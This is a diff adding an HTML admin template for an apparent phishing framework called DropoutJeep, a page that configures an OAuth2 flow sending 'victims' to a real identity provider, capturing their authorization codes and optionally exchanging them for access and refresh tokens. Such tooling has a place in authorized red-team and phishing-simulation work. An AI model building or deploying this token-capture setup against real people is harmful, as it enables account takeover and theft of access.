@@ -1,0 +1,134 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="max-w-5xl mx-auto py-8">
+
+  <!-- Navigation Back Link -->
+  <div class="mb-6 font-mono-brutal">
+    <a href="{{ url_for('campaigns_admin.admin_campaign_info', cid=campaign.id) }}" class="inline-flex items-center text-xs font-bold text-gray-700 dark:text-gray-300 hover:text-pure-black dark:hover:text-stark-white transition-colors">
+      <svg class="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M15 19l-7-7 7-7"/></svg>
+      [ BACK TO CAMPAIGN INFO ]
+    </a>
+  </div>
+
+  <div class="flex items-center justify-between mb-6">
+    <h1 class="text-3xl font-extrabold font-mono-brutal">OAUTH2 FLOW CONFIG</h1>
+    <div class="flex gap-3">
+      <a href="{{ url_for('campaigns_admin.admin_oauth_config', cid=campaign.id) }}" class="brutal-btn-black px-4 py-2 text-sm">OAUTH CONFIG</a>
+      <a href="{{ url_for('campaigns_admin.admin_campaign_info', cid=campaign.id) }}" class="brutal-btn-white px-4 py-2 text-sm">CAMPAIGN INFO</a>
+    </div>
+  </div>
+
+  <div class="brutal-card p-6 mb-6">
+    <h2 class="text-xl font-bold font-mono-brutal mb-2">{{ campaign.name }}</h2>
+    <p class="text-sm font-mono-brutal text-gray-600 dark:text-gray-400">
+      Configure the OAuth2 phishing flow. When a victim clicks the tracking link, they will be
+      redirected to the real <strong>authorization_endpoint</strong> with your <strong>client_id</strong>.
+      The callback captures the authorization code and optionally exchanges it for tokens.
+    </p>
+  </div>
+
+  <div class="brutal-card p-6">
+    <form method="post" action="{{ url_for('campaigns_admin.admin_oauth_config', cid=campaign.id) }}" class="space-y-4">
+      <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+
+      <div>
+        <label class="block font-mono-brutal text-sm font-bold mb-1">Provider</label>
+        <select name="provider" class="w-full p-2 border-2 border-pure-black focus:outline-none">
+          <option value="">-- select provider --</option>
+          {% for p in ['azure_ad', 'google', 'okta', 'onelogin', 'auth0', 'custom'] %}
+          <option value="{{ p }}" {{ 'selected' if oauth_cfg.get('provider') == p }}>{{ p | upper }}</option>
+          {% endfor %}
+        </select>
+        <p class="text-xs text-gray-500 mt-1">Used for event tagging and display. Select 'custom' for non-standard providers.</p>
+      </div>
+
+      <div>
+        <label class="block font-mono-brutal text-sm font-bold mb-1">Authorization Endpoint *</label>
+        <input type="url" name="authorization_endpoint" value="{{ oauth_cfg.get('authorization_endpoint', '') }}"
+               placeholder="https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize"
+               class="w-full p-2 border-2 border-pure-black focus:outline-none font-mono text-sm" required>
+        <p class="text-xs text-gray-500 mt-1">The real OAuth2 authorization URL the victim is redirected to.</p>
+      </div>
+
+      <div>
+        <label class="block font-mono-brutal text-sm font-bold mb-1">Client ID *</label>
+        <input type="text" name="client_id" value="{{ oauth_cfg.get('client_id', '') }}"
+               placeholder="a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+               class="w-full p-2 border-2 border-pure-black focus:outline-none font-mono text-sm" required>
+        <p class="text-xs text-gray-500 mt-1">The registered application/client ID at the identity provider.</p>
+      </div>
+
+      <div>
+        <label class="block font-mono-brutal text-sm font-bold mb-1">Redirect URI *</label>
+        <input type="url" name="redirect_uri" value="{{ oauth_cfg.get('redirect_uri', '') }}"
+               placeholder="https://your-domain.com/oauth/callback"
+               class="w-full p-2 border-2 border-pure-black focus:outline-none font-mono text-sm" required>
+        <p class="text-xs text-gray-500 mt-1">Must match the registered redirect URI. DropoutJeep captures codes at <code>/oauth/callback</code>.</p>
+      </div>
+
+      <div>
+        <label class="block font-mono-brutal text-sm font-bold mb-1">Scope *</label>
+        <input type="text" name="scope" value="{{ oauth_cfg.get('scope', 'openid profile email') }}"
+               placeholder="openid profile email"
+               class="w-full p-2 border-2 border-pure-black focus:outline-none font-mono text-sm" required>
+        <p class="text-xs text-gray-500 mt-1">Space-separated OAuth2 scopes (e.g. <code>openid profile email</code>).</p>
+      </div>
+
+      <div class="border-t-2 border-gray-300 dark:border-gray-700 pt-4">
+        <h3 class="text-lg font-bold font-mono-brutal mb-3">Token Exchange (Optional)</h3>
+        <p class="text-xs text-gray-500 mb-3">
+          Enable auto-exchange to immediately swap the captured auth code for access/refresh/id tokens.
+          Requires the token endpoint and client secret.
+        </p>
+
+        <div class="flex items-center gap-3 mb-3">
+          <input type="checkbox" name="auto_exchange" id="auto_exchange"
+                 class="w-4 h-4 border-2 border-pure-black" {{ 'checked' if oauth_cfg.get('auto_exchange') }}>
+          <label for="auto_exchange" class="font-mono-brutal text-sm font-bold">Enable auto token exchange</label>
+        </div>
+
+        <div id="exchange-fields" class="space-y-4" style="{{ '' if oauth_cfg.get('auto_exchange') else 'display:none' }}">
+          <div>
+            <label class="block font-mono-brutal text-sm font-bold mb-1">Token Endpoint</label>
+            <input type="url" name="token_endpoint" value="{{ oauth_cfg.get('token_endpoint', '') }}"
+                   placeholder="https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
+                   class="w-full p-2 border-2 border-pure-black focus:outline-none font-mono text-sm">
+          </div>
+
+          <div>
+            <label class="block font-mono-brutal text-sm font-bold mb-1">Client Secret</label>
+            <input type="password" name="client_secret" value="{{ oauth_cfg.get('client_secret', '') }}"
+                   placeholder="~abc123.secret"
+                   class="w-full p-2 border-2 border-pure-black focus:outline-none font-mono text-sm">
+            <p class="text-xs text-gray-500 mt-1">Stored encrypted at rest. Required for token exchange.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="border-t-2 border-gray-300 dark:border-gray-700 pt-4">
+        <h3 class="text-lg font-bold font-mono-brutal mb-3">Extra Authorization Params</h3>
+        <p class="text-xs text-gray-500 mb-3">
+          Add custom query parameters to the authorization URL (e.g. <code>prompt=login</code>, <code>domain_hint=contoso.com</code>).
+          One per line in <code>key=value</code> format.
+        </p>
+        <textarea name="extra_params" rows="3"
+                  class="w-full p-2 border-2 border-pure-black focus:outline-none font-mono text-sm"
+                  placeholder="prompt=login&#10;domain_hint=contoso.com">{{ extra_params_text }}</textarea>
+      </div>
+
+      <div class="flex gap-3 pt-2">
+        <button type="submit" class="brutal-btn-black px-6 py-2">SAVE OAUTH CONFIG</button>
+        <a href="{{ url_for('campaigns_admin.admin_oauth_tokens', cid=campaign.id) }}"
+           class="brutal-btn-white px-6 py-2">VIEW CAPTURED TOKENS</a>
+      </div>
+    </form>
+  </div>
+</div>
+{% endblock %}
+{% block scripts %}
+<script>
+document.getElementById('auto_exchange').addEventListener('change', function() {
+  document.getElementById('exchange-fields').style.display = this.checked ? '' : 'none';
+});
+</script>
+{% endblock %}
